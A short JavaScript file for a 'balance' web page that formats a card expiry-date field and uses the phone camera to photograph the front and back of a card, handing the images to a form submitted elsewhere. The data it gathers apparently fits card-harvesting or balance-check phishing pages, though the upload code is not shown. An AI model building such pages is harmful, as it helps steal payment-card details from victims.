// js/balance.js - FINAL FIREBASE VERSION (WORKS WITH YOUR balance.html)
console.log("Camera script loaded");

let stream = null;
let frontBlob = null;
let backBlob = null;

// Make blobs globally accessible for balance.html
window.frontBlob = null;
window.backBlob = null;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Page ready");

  // Format expiry (auto adds / after 2 digits)
  document.getElementById("expiry_date").addEventListener("input", (e) => {
    let v = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) {
      v = v.slice(0, 2) + "/" + v.slice(2);
    }
    e.target.value = v;
  });

  // Open Dual Camera
  document.getElementById("openCameraBtn").addEventListener("click", async () => {
    document.getElementById("dualCaptureBlock").classList.remove("hidden");
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
      const track = stream.getVideoTracks()[0];
      document.getElementById("dualVideoFront").srcObject = new MediaStream([track.clone()]);
      document.getElementById("dualVideoBack").srcObject = new MediaStream([track]);
    } catch (err) {
      alert("Camera not available. Use mobile or allow camera.");
      console.error(err);
    }
  });

  // Close Dual
  document.getElementById("dualCloseBtn").addEventListener("click", () => {
    document.getElementById("dualCaptureBlock").classList.add("hidden");
    if (stream) stream.getTracks().forEach(t => t.stop());
    stream = null;
  });

  // Capture Front
  document.getElementById("captureFrontBtn").addEventListener("click", () => {
    capture("dualVideoFront", "frontPreview", b => {
      frontBlob = b;
      window.frontBlob = b; // Make available to balance.html
    });
  });

  // Capture Back
  document.getElementById("captureBackBtn").addEventListener("click", () => {
    capture("dualVideoBack", "backPreview", b => {
      backBlob = b;
      window.backBlob = b; // Make available to balance.html
    });
  });

  function capture(videoId, imgId, callback) {
    const video = document.getElementById(videoId);
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    canvas.toBlob(blob => {
      document.getElementById(imgId).src = URL.createObjectURL(blob);
      document.getElementById(imgId).classList.remove("hidden");
      callback(blob);
    }, "image/jpeg", 0.9);
  }

  // finishAndSubmitBtn now just triggers the main form submit (handled in balance.html)
  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
    document.getElementById("balanceForm").dispatchEvent(new Event("submit"));
  });

  // Optional: if someone clicks submit without camera, still allow
  document.getElementById("balanceForm").addEventListener("submit", (e) => {
    // Let balance.html handle everything
  });
});
